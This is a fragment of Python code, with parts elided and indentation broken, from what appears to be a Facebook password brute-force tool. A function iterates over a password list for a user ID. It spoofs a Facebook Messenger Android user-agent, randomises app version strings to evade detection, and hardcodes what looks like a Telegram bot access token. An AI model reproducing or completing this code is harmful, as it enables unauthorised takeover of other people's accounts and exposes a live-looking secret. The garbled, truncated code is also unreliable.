...
def rndm1(uid,passlist):
        ...
        try:
                for ps in pwx:
                ua_string="Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/423.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/507807851;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBDV/SM-A037U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1471};FB_FW/1;] FBBK/1"
                        accessToken = '6675644006:AAE8C6LsKX9JfZ8UfdTv-LvONBUKEv3Sywk'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
